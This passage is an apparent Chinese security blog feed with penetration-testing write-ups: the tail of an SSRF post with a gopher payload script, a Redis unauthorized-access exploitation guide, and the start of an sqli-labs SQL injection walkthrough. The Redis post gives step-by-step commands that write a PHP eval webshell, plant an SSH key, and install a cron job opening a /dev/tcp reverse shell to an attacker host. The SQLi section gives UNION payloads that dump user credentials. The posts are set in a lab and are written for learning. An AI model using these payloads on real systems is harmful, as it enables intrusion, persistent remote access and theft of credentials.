line[-3:-1] == r&apos;\r&apos;:</div><div class="line">            # 如果该行只有\r，将\r替换成%0a%0d%0a</div><div class="line">            if len(line) == 3:</div><div class="line">                exp = exp + &apos;%0a%0d%0a&apos;</div><div class="line">            else:</div><div class="line">                line = line.replace(r&apos;\r&apos;, &apos;%0d%0a&apos;)</div><div class="line">                # 去掉最后的换行符</div><div class="line">                line = line.replace(&apos;\n&apos;, &apos;&apos;)</div><div class="line">                exp = exp + line</div><div class="line">        # 判断是否是空行，空行替换为%0a</div><div class="line">        elif line == &apos;\x0a&apos;:</div><div class="line">            exp = exp + &apos;%0a&apos;</div><div class="line">        else:</div><div class="line">            line = line.replace(&apos;\n&apos;, &apos;&apos;)</div><div class="line">            exp = exp + line</div><div class="line">print exp</div></pre></td></tr></table></figure><h4 id="测试脚本是否可用"><a href="#测试脚本是否可用" class="headerlink" title="测试脚本是否可用"></a>测试脚本是否可用</h4><p><code>curl -v &#39;gopher://127.0.0.1:6379/_生成的exp</code></p><h4 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h4><p>我在复现的时候，不知道哪儿出了问题，一直报错 <code>curl: (3) [globbing] illegal character in range specification at pos 87</code></p><h2 id="0x05-可能存在漏洞的地方"><a href="#0x05-可能存在漏洞的地方" class="headerlink" title="0x05 可能存在漏洞的地方"></a>0x05 可能存在漏洞的地方</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">share    </div><div class="line">wap    </div><div class="line">url    </div><div class="line">link    </div><div class="line">src    </div><div class="line">source    </div><div class="line">target    </div><div class="line">u    </div><div class="line">3g    </div><div class="line">display    </div><div class="line">sourceURl    </div><div class="line">imageURL    </div><div class="line">domain</div></pre></td></tr></table></figure><h2 id="0x06-修复方案"><a href="#0x06-修复方案" class="headerlink" title="0x06 修复方案"></a>0x06 修复方案</h2><ul><li>限制协议为HTTP、HTTPS</li><li>禁止30x跳转</li><li>设置URL白名单或者限制内网IP</li></ul><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><h3 id="SSRF-in-PHP"><a href="#SSRF-in-PHP" class="headerlink" title="SSRF in PHP"></a>SSRF in PHP</h3><blockquote><p><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="external">https://joychou.org/web/phpssrf.html</a></p></blockquote><h3 id="SSRF漏洞分析与利用"><a href="#SSRF漏洞分析与利用" class="headerlink" title="SSRF漏洞分析与利用"></a>SSRF漏洞分析与利用</h3><blockquote><p><a href="http://www.91ri.org/17111.html" target="_blank" rel="external">http://www.91ri.org/17111.html</a></p></blockquote><h3 id="利用-gopher-协议拓展攻击面"><a href="#利用-gopher-协议拓展攻击面" class="headerlink" title="利用 gopher 协议拓展攻击面"></a>利用 gopher 协议拓展攻击面</h3><blockquote><p><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="external">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></p></blockquote><h3 id="SSRF-详解"><a href="#SSRF-详解" class="headerlink" title="SSRF 详解"></a>SSRF 详解</h3><blockquote><p><a href="https://blog.csdn.net/qq_30135181/article/details/52734225" target="_blank" rel="external">https://blog.csdn.net/qq_30135181/article/details/52734225</a></p></blockquote><h3 id="SSRF漏洞-原理-amp-绕过姿势"><a href="#SSRF漏洞-原理-amp-绕过姿势" class="headerlink" title="SSRF漏洞(原理&amp;绕过姿势)"></a>SSRF漏洞(原理&amp;绕过姿势)</h3><blockquote><p><a href="https://www.t00ls.net/articles-41070.html" target="_blank" rel="external">https://www.t00ls.net/articles-41070.html</a></p></blockquote><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><blockquote><p><a href="https://www.jianshu.com/p/ad7b8079e0d5" target="_blank" rel="external">https://www.jianshu.com/p/ad7b8079e0d5</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer8&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer8&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;
&lt;h2 id=&quot;0x01-SSRF-概述&quot;&gt;&lt;a href=&quot;#0x01-SSRF-概述&quot; class=&quot;headerlink&quot; title=&quot;0x01 SSRF 概述&quot;&gt;&lt;/a&gt;0x01 SSRF 概述&lt;/h2&gt;&lt;p&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）&lt;/p&gt;
&lt;p&gt;SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://damit5.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Redis未授权访问漏洞利用</title>
    <link href="https://damit5.com/2018/05/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/</id>
    <published>2018-05-18T03:30:00.000Z</published>
    <updated>2018-06-10T03:58:59.146Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer6" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer6"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script><h2 id="0x00-危害"><a href="#0x00-危害" class="headerlink" title="0x00 危害"></a>0x00 危害</h2><p><strong>信息泄露</strong></p><ul><li>系统信息</li><li>redis保存的信息</li></ul><p><strong>GetShell</strong></p><ul><li>在Web目录中写入webshell</li><li>写入SSH公钥直接连接</li><li>写入计划任务(corntab)反弹shell</li></ul><a id="more"></a><h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><table><thead><tr><th>鸡型</th><th>ip</th><th>服务</th><th>版本</th></tr></thead><tbody><tr><td>攻击鸡</td><td>192.168.1.100</td><td>Windows</td><td>10</td></tr><tr><td>攻击鸡</td><td>192.168.1.100</td><td>redis-cli</td><td>3.0.501</td></tr><tr><td>受害鸡</td><td>192.168.1.105</td><td>Ubuntu</td><td>16.04 LTS</td></tr><tr><td>受害鸡</td><td>192.168.1.105</td><td>redis-server</td><td>3.0.6</td></tr><tr><td>受害鸡</td><td>192.168.1.105</td><td>Apache</td><td>2.4.18 (Ubuntu)</td></tr></tbody></table><ul><li>因为新版的 redis 默认绑定的地址为 <code>127.0.0.1</code>，所以为了复现漏洞，我们将绑定端口改成<code>0.0.0.0</code></li></ul><p><code>sudo vim redis.conf</code></p><p>将 <code>69</code> 行的 <code>127.0.0.1</code> 修改为 <code>0.0.0.0</code></p><p><img src="img/1.png" alt="change_bind_ip"></p><ul><li>启动redis必须使用 root 权限启动，否则<code>save</code>时会报错</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 关闭 redis 服务</div><div class="line">sudo service redis-server stop</div><div class="line"># 打开 redis 服务</div><div class="line">cd /usr/bin/ &amp;&amp; sudo redis-server</div></pre></td></tr></table></figure><h2 id="0x02-信息泄露"><a href="#0x02-信息泄露" class="headerlink" title="0x02 信息泄露"></a>0x02 信息泄露</h2><h3 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h3><p><strong>获取所有的key值</strong> <code>keys *</code></p><p>具体查看数据可以查看redis教程</p><blockquote><p><a href="http://www.runoob.com/redis/redis-tutorial.html" target="_blank" rel="external">http://www.runoob.com/redis/redis-tutorial.html</a></p></blockquote><p><img src="img/2.png" alt="get_keys"></p><h3 id="系统信息泄露"><a href="#系统信息泄露" class="headerlink" title="系统信息泄露"></a>系统信息泄露</h3><p><code>info</code> 命令</p><p>可以看到redis的版本、系统内核版本、配置文件路径等信息</p><p><img src="img/3.png" alt="info"></p><h2 id="0x03-GetShell"><a href="#0x03-GetShell" class="headerlink" title="0x03 GetShell"></a>0x03 GetShell</h2><h3 id="在Web目录中写入webshell"><a href="#在Web目录中写入webshell" class="headerlink" title="在Web目录中写入webshell"></a>在Web目录中写入webshell</h3><p><strong>前提条件</strong></p><p>已知网站目录的绝对路径，并且具有读写权限</p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><strong>启动apache服务器</strong></p><p><code>sudo service apache2 start</code></p><p><strong>查看apache服务器状态</strong></p><p><code>sudo service apache2 status</code></p><p>有一个 <strong>running</strong> 则说明在运行状态</p><p><img src="img/4.png" alt="running"></p><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><h5 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># 写入一个string内容</div><div class="line">set shell &quot;&lt;?php @eval($_POST[&apos;shell&apos;]);?&gt;&quot;</div><div class="line"># 设置备份目录</div><div class="line">config set dir /var/www/html/</div><div class="line"># 设置备份文件名</div><div class="line">config set dbfilename shell.php</div><div class="line"># 保存文件到本地</div><div class="line">save</div></pre></td></tr></table></figure><p><img src="img/5.png" alt="config"></p><h5 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h5><p><img src="img/6.png" alt="Cknife"></p><h3 id="写入SSH公钥直接连接"><a href="#写入SSH公钥直接连接" class="headerlink" title="写入SSH公钥直接连接"></a>写入SSH公钥直接连接</h3><ul><li>本地生成公钥和私钥</li><li>将公钥写入到目标的<code>.ssh</code>文件夹</li><li>ssh 连接</li></ul><h4 id="在本地生成公钥和私钥"><a href="#在本地生成公钥和私钥" class="headerlink" title="在本地生成公钥和私钥"></a>在本地生成公钥和私钥</h4><p>PS : 这里为了方便，我直接从受害鸡里面生成的公钥和私钥，然后再将他们剪切到攻击鸡</p><p><code>ssh-keygen -t rsa</code></p><p><img src="img/7.png" alt="generate_ssh"></p><p><img src="img/8.png" alt="cat_key"></p><h4 id="将公钥写入文件中"><a href="#将公钥写入文件中" class="headerlink" title="将公钥写入文件中"></a>将公钥写入文件中</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># 备份文件目录设置为对应的 .ssh，部分为 /root/.ssh/</div><div class="line">config set dir /home/lynn/.ssh/</div><div class="line"></div><div class="line">config set dbfilename authorized_keys</div><div class="line"></div><div class="line"># 保存key的时候加上两个`\n`是为了避免和Redis里其他缓存数据混合</div><div class="line">set key &quot;\n\n\生成的公钥n\n&quot;</div><div class="line"></div><div class="line">save</div></pre></td></tr></table></figure><p><img src="img/9.png" alt="cat_key"></p><h4 id="ssh-连接"><a href="#ssh-连接" class="headerlink" title="ssh 连接"></a>ssh 连接</h4><p><code>ssh -i id_rsa lynn@192.168.1.105</code></p><p><img src="img/10.png" alt="cat_key"></p><p>可以看到不需要输入密码直接连接</p><h3 id="写入计划任务-corntab-反弹shell"><a href="#写入计划任务-corntab-反弹shell" class="headerlink" title="写入计划任务(corntab)反弹shell"></a>写入计划任务(corntab)反弹shell</h3><p><strong>！注意！</strong></p><p>这里有一个很深的坑，那就是</p><p>crontab反弹debain,ubuntu都不行，因为他们对计划任务的格式很严格，必须要执行 </p><p><code>crontab -u root /var/spool/cron/crontabs/root</code></p><p>通过语法检查后，才能执行计划任务。</p><p>因为这个坑，用了整整一天的时间来研究这个</p><p>参考文章</p><blockquote><p><a href="http://www.freebuf.com/vuls/148758.html" target="_blank" rel="external">http://www.freebuf.com/vuls/148758.html</a></p></blockquote><p>主要是感谢下方的评论</p><hr><h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h4><p>和写入公钥一样，将文件保存到本地，备份文件名必须要和用户的名字一样，比如是 lsa 那么备份文件就是 lsa</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">set shell &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.100/1234 0&gt;&amp;1\n\n&quot;</div><div class="line">config set dir /var/spool/cron/crontabs/</div><div class="line">config set dbfilename root</div><div class="line">save</div></pre></td></tr></table></figure><h4 id="攻击鸡开启监听"><a href="#攻击鸡开启监听" class="headerlink" title="攻击鸡开启监听"></a>攻击鸡开启监听</h4><p><code>nc -lvp 1234</code></p><p><img src="img/11.png" alt="nc_1"></p><h4 id="等待-1-分钟"><a href="#等待-1-分钟" class="headerlink" title="等待 1 分钟"></a>等待 1 分钟</h4><p>等待一分钟受害鸡即可执行任务，攻击鸡就可以收到shell</p><p><img src="img/12.png" alt="nc_2"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>redis未授权访问总的来说危害还是挺大的</p><p>但是实际过程中还是会遇到很多很多的问题</p><p>比如</p><ul><li>redis数据量稍微大一点，写shell到文件之后，php因为文件太大是会拒绝执行的</li><li>redis写入的时候就会覆盖passwd，而且passwd不能恢复</li><li>debian,ubuntu 计划任务的限制很严格，写入成功是不能执行的</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer6&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer6&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;
&lt;h2 id=&quot;0x00-危害&quot;&gt;&lt;a href=&quot;#0x00-危害&quot; class=&quot;headerlink&quot; title=&quot;0x00 危害&quot;&gt;&lt;/a&gt;0x00 危害&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;信息泄露&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统信息&lt;/li&gt;
&lt;li&gt;redis保存的信息&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;GetShell&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在Web目录中写入webshell&lt;/li&gt;
&lt;li&gt;写入SSH公钥直接连接&lt;/li&gt;
&lt;li&gt;写入计划任务(corntab)反弹shell&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://damit5.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>通过 sqli-labs 学习SQL注入</title>
    <link href="https://damit5.com/2018/05/11/%E9%80%9A%E8%BF%87-sqli-labs-%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://damit5.com/2018/05/11/通过-sqli-labs-学习SQL注入/</id>
    <published>2018-05-11T14:24:36.000Z</published>
    <updated>2018-06-10T04:00:35.194Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer18" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer18"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script><h1 id="写在最前"><a href="#写在最前" class="headerlink" title="写在最前"></a>写在最前</h1><p><strong>SQLI定义</strong>：SQL注入即是指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><a id="more"></a><h2 id="可能用到的函数解释"><a href="#可能用到的函数解释" class="headerlink" title="可能用到的函数解释"></a>可能用到的函数解释</h2><h3 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h3><ul><li>ORDER BY 语句用于对结果集进行排序。</li><li>ORDER BY 语句默认按照升序对记录进行排序。</li></ul><h3 id="exists-函数"><a href="#exists-函数" class="headerlink" title="exists() 函数"></a>exists() 函数</h3><ul><li>存在的话返回结果为：1（true）</li><li>不存在的话返回结果：0（false）</li></ul><h3 id="mid-函数"><a href="#mid-函数" class="headerlink" title="mid() 函数"></a>mid() 函数</h3><p>ord(mid())</p><p><code>mid(striing,start,length)</code></p><ul><li><p>string : (必需)规定要返回其中一部分的字符串。</p></li><li><p>start : (必需)规定开始位置（起始值是 1）。</p></li><li><p>length : (可选)要返回的字符数。如果省略，则 mid() 函数返回剩余文本。</p></li></ul><h3 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr() 函数"></a>substr() 函数</h3><p>ascii(substr())<br><code>substr(string,num start,num length);</code></p><ul><li><p>string : 为字符串；</p></li><li><p>start : 为起始位置 ( mysql中的start是从1开始的 )</p></li><li><p>length : 为长度。</p></li></ul><h3 id="left-函数"><a href="#left-函数" class="headerlink" title="left() 函数"></a>left() 函数</h3><p><code>left(string,length)</code></p><ul><li><p>string : (必需)规定要返回其中一部分的字符串</p></li><li><p>length : (可选) 规定被返回字符串的前length长度的字符</p></li></ul><h3 id="limit-函数"><a href="#limit-函数" class="headerlink" title="limit  函数"></a>limit  函数</h3><p><code>limit m,n</code></p><ul><li>从 m 开始取 n 个</li></ul><h3 id="if-函数"><a href="#if-函数" class="headerlink" title="if() 函数"></a>if() 函数</h3><p>在MySQL中，if（）函数语法如下：</p><p><code>IF(expr1,expr2,expr3)</code></p><p>如果 expr1 为真，则 IF()函数执行expr2语句; 否则 IF()函数执行expr3语句。</p><h3 id="sleep-函数"><a href="#sleep-函数" class="headerlink" title="sleep() 函数"></a>sleep() 函数</h3><p>在mysql中，sleep()函数语法如下：</p><p><code>sleep(seconds)</code></p><p>即sleep() 函数代码执行延迟若干秒。</p><p>我们在这里使用IF（查询语句，1，sleep（5）），即如果我们的查询语句<strong>为真</strong>，那么<strong>直接返回结果</strong>；如果我们的查询语句<strong>为假</strong>，那么<strong>过5秒之后</strong>返回页面。所以我们就根据返回页面的时间长短来判断我们的查询语句是否执行正确，即我们的出发点就回到了之前的基于布尔的SQL盲注，也就是构造查询语句来判断结果是否为真。</p><h3 id="benchmark-函数"><a href="#benchmark-函数" class="headerlink" title="benchmark() 函数"></a>benchmark() 函数</h3><p><code>BENCHMARK(count,expr)</code></p><p>  将表达式expr重复运行count次</p><p>在一定条件上能达到sleep()的效果</p><p><code>benchmark(10000000,null);</code></p><h3 id="length-函数"><a href="#length-函数" class="headerlink" title="length() 函数"></a>length() 函数</h3><p>获得长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select length(123456);</div><div class="line">+----------------+</div><div class="line">| length(123456) |</div><div class="line">+----------------+</div><div class="line">|              6 |</div><div class="line">+----------------+</div></pre></td></tr></table></figure><h3 id="concat-函数"><a href="#concat-函数" class="headerlink" title="concat() 函数"></a>concat() 函数</h3><p><code>concat(str1,str2,...)</code></p><p>没有分隔符的连接字符串</p><h3 id="concat-ws-函数"><a href="#concat-ws-函数" class="headerlink" title="concat_ws() 函数"></a>concat_ws() 函数</h3><p><code>concat_ws(separator,str1,str2...)</code></p><p>含有分隔符的连接字符串</p><h3 id="group-concat-函数"><a href="#group-concat-函数" class="headerlink" title="group_concat() 函数"></a>group_concat() 函数</h3><p><code>group_concat(str1,str2,...)</code></p><p>连接一个组的所有字符串，并以逗号分隔每一条数据</p><h3 id="load-file-函数"><a href="#load-file-函数" class="headerlink" title="load_file() 函数"></a>load_file() 函数</h3><p><code>load_file(file_name)</code></p><p>读取文件内容，可以将文件名转换成ASCII码或者十六进制的形式</p><p>ASCII码需要用<code>char()</code>函数,<code>char(96,97)</code></p><p>十六进制前面要加上 <code>0x</code></p><p>读取内容不显示的情况下，可以用<code>hex()</code>函数</p><p><code>hex(load_file())</code></p><h3 id="insert-函数"><a href="#insert-函数" class="headerlink" title="insert() 函数"></a>insert() 函数</h3><p>向数据库中增加一行</p><p><code>insert [into] 表名 [(列名1, 列名2, 列名3, ...)] values (值1, 值2, 值3, ...);</code></p><h3 id="delete-函数"><a href="#delete-函数" class="headerlink" title="delete() 函数"></a>delete() 函数</h3><p>删除数据库的内容</p><p><code>delete from 表名称 where 删除条件;</code></p><h3 id="drop-函数"><a href="#drop-函数" class="headerlink" title="drop() 函数"></a>drop() 函数</h3><p>删除结构</p><p><code>drop database 数据库名</code></p><p><code>drop tables 表名</code></p><h3 id="alter-函数"><a href="#alter-函数" class="headerlink" title="alter() 函数"></a>alter() 函数</h3><p>删除表中的列</p><p><code>alter table 表名 drop 列名称;</code></p><h3 id="update-函数"><a href="#update-函数" class="headerlink" title="update() 函数"></a>update() 函数</h3><p>更新表中的数据</p><p><code>update 表名称 set 列名称=新值 where 更新条件;</code></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>搭建需要环境</strong></p><p>apache + php + mysql</p><p><strong>下载 phpstudy</strong></p><p>百度 phpstudy 下载</p><p><strong>源码下载地址</strong></p><blockquote><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a></p></blockquote><p><strong>安装sql-libs</strong></p><ul><li>将下载的源码解压到 <code>phpstudy</code> 的 <code>www</code> 目录下</li><li>编辑下载源码中的 <code>/sql-connections/db-creds.inc</code> 文件</li><li>将数据库的<strong>username</strong>和<strong>password</strong>修改为你自己的<strong>mysql</strong>账号和密码（phpstudy中自带mysql环境用户名密码均为<strong>root</strong>）</li><li>访问 <code>http://127.0.0.1/</code> 页面</li><li>点击 <code>Setup/reset Database for labs</code></li></ul><p><strong>配置文件截图</strong></p><p><img src="img/sqli_labs_1.png" alt="config"></p><p><strong>搭建成功截图</strong></p><p><img src="img/sqli_labs_2.png" alt="success"></p><p><strong>tips：</strong> 为了方便学习查看，可以在源码中的<code>$sql</code>下一句语句写上以下php语句（可以看到数据库查询的完整语句是怎么样的）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo &quot;你的 sql 语句是：&quot;.$sql.&quot;&lt;br&gt;&quot;;</div></pre></td></tr></table></figure></p><h1 id="开始闯关"><a href="#开始闯关" class="headerlink" title="开始闯关"></a>开始闯关</h1><h2 id="Less-1-UNION-注入"><a href="#Less-1-UNION-注入" class="headerlink" title="Less-1 (UNION 注入)"></a>Less-1 (UNION 注入)</h2><h3 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><p><strong>先加 <code>&#39;</code> 试试</strong></p><p><img src="img/sqli_labs_3.png" alt="less_1_1"></p><p>报错</p><p>那是因为我们之前的语句闭合了前面的<code>&#39;</code>，而后面单一个<code>&#39;</code>，所以会报错</p><p>于是修改我们的<code>payload</code></p><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and 1=1+--+</code></p><p><img src="img/sqli_labs_4.png" alt="less_1_2"></p><p>没有报错，可以返回正常数据，说明我们后面的注释起到了作用，把<code>LIMIT 0,1&#39;</code>注释掉了</p><p><strong>UNION 注入</strong></p><h3 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h3><p><code>order by 4</code> 出错</p><p><img src="img/sqli_labs_5.png" alt="less_1_3"></p><p><code>order by 3</code> 不出错，说明有<strong>3</strong>列</p><p><img src="img/sqli_labs_6.png" alt="less_1_4"></p><h3 id="判断显位"><a href="#判断显位" class="headerlink" title="判断显位"></a>判断显位</h3><p>首先应该查询显位，以便后面显示数据</p><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; union select 1,2,3+--+</code></p><p><img src="img/sqli_labs_7.png" alt="less_1_5"></p><p>这里并没有显示出显位，所以我们再 <code>id=1</code> 中的 <code>1</code> 前面加上一个 <code>-</code>，让原来查询的数据不能显示出来，这样就可以让我们后面查询的1,2,3 可以显示出来</p><p><img src="img/sqli_labs_8.png" alt="less_1_6"></p><p>成功显示出显位数字，为 <strong>2</strong> 和 <strong>3</strong>，后续的查询结果都将在这2个地方显示</p><h3 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">version()       ---看数据库的版本</div><div class="line">database()---查数据库名称</div><div class="line">user()---查当前数据库用户的权限</div><div class="line">@@version_compile_os---查看操作系统版本</div><div class="line">@@datadir   ---数据库路径</div></pre></td></tr></table></figure><p>可以查询的内容有如上，查询数据库名，我们选择<code>database()</code></p><p>修改 <code>2</code> 为 <code>database()</code></p><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,database(),3+--+</code></p><p><img src="img/sqli_labs_9.png" alt="less_1_7"></p><p>可以看出数据库名字为 <code>security</code></p><h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27+--+</code></p><p><img src="img/sqli_labs_10.png" alt="less_1_8"></p><p>也可以将最后的 <code>&#39;security&#39;</code> 换成十六进制</p><h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><p>假设我们只对 <code>user</code> 表感兴趣</p><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27users%27+--+</code></p><p><img src="img/sqli_labs_11.png" alt="less_1_9"></p><p>同理也可以将最后的 <code>&#39;users&#39;</code> 换成十六进制</p><h3 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h3><p>假设这里我们只对 <code>username</code> 和 <code>password</code> 感兴趣</p><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,username,password%20from%20users+--+</code></p><p><img src="img/sqli_labs_12.png" alt="less_1_10"></p><p>但是这里只有一个内容，如果想要所有内容，可以采用 <code>limit</code> 的方法来依次读取</p><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,username,password%20from%20users%20limit%200,1+--+</code></p><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,username,password%20from%20users%20limit%201,1+--+</code></p><p>或者用 <code>group_concat()</code> 函数来一次性输出所有内容</p><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(username),group_concat(password)%20from%20users+--+</code></p><p><img src="img/sqli_labs_13.png" alt="less_1_11"></p><h2 id="Less-2（UNION-注入）"><a href="#Less-2（UNION-注入）" class="headerlink" title="Less-2（UNION 注入）"></a>Less-2（UNION 注入）</h2><h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p><code>http://127.0.0.1/sqli-labs/Less-2/?id=1%27%20and%201=1%20+--+</code></p><p>报错</p><p><code>http://127.0.0.1/sqli-labs/Less-2/?id=1%20and%201=1%20+--+</code></p><p>不报错</p><p>说明这里接收的<code>id</code>参数类型为 <code>int</code> 型，也就是没有 <code>&#39;</code> 去闭合</p><h3 id="判断列长"><a href="#判断列长" class="headerlink" 